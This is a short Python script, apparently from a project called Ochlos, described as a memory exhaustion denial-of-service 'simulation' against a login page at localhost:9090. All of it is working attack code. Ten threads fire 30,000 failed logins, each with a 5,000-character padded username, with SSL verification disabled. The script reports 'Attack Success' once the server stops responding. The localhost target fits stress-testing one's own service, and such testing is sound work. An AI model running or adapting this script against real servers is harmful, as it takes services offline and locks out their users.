# Ochlos/scripts/memory_exhaustion.py
# Perform memory exhaustion attack to localhost:9090

import requests
import threading
import urllib3
import requests
import uuid
import concurrent.futures


# Disable SSL verification warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TARGET_URL = "https://localhost:9090/login"

stop_event = threading.Event() # Stop exec flag

def send_failed_login(index):
    if stop_event.is_set():
        return

    long_padding = "A" * 5000
    random_username = f"user_{long_padding}_{uuid.uuid4().hex}"

    payload = {
        "username": random_username,
        "password": "wrong_password"
    }

    if index % 100 == 0:
        print(f"[+] Sending request #{index}...")

    try:
        requests.post(TARGET_URL, data=payload, verify=False, timeout=1)
    except (requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
        if not stop_event.is_set():
            stop_event.set()
            print(f"\n[!] Attack Success! Server is down (DoS verified at request #{index}).")
            print("[+] Stopping attack program...")
    except Exception as e:
        pass


if __name__ == "__main__":
    print("[+] Starting Memory Exhaustion DoS Attack simulation...")

    # max_workers : thread
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        executor.map(send_failed_login, range(30000))

    print("[+] Simulation complete")